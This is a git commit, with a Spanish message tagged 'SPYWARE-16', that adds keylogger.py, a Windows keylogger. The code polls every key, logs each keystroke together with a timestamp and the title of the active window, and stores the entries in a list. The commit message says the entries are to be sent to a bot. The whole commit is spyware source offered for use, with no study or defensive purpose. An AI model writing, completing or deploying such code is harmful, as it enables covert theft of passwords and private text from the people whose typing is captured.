b2b359030fa6becec615a4f03896cf60c79d883b
Inogue <113333811+Inogue@users.noreply.github.com>
2025-01-10 21:49:10 +0100

    SPYWARE-16 Implementación del bot 1rª parte
    Primera parte para enviar la información recogida por el keylogger al bot.

---
+++ keylogger.py
@@ -0,0 +1,23 @@
+import asyncio
+from datetime import datetime
+import win32api
+import win32gui
+from helpers import get_key, registro_errores
+
+lista_teclas = []
+
+async def capturar_teclas(bot):
+    global lista_teclas
+    while True:
+        await asyncio.sleep(0.01)
+        hwnd = win32gui.GetForegroundWindow()
+        window_title = win32gui.GetWindowText(hwnd)
+        mayuscula = win32api.GetKeyState(0x10) & 0x8000 != 0
+        alt_gr = (win32api.GetKeyState(0x11) & 0x8000 != 0) and (win32api.GetKeyState(0x12) & 0x8000 != 0)
+        timestamp = datetime.now().strftime("[%H-%M-%S]")
+
+        for codigo_tecla in range(256):
+            if win32api.GetAsyncKeyState(codigo_tecla) & 1:
+                tecla = f"{timestamp} |{window_title.strip()}|  ({get_key(codigo_tecla, mayuscula, alt_gr)})"
+                lista_teclas.append(tecla)
+                print(f"Key captured: {tecla}")
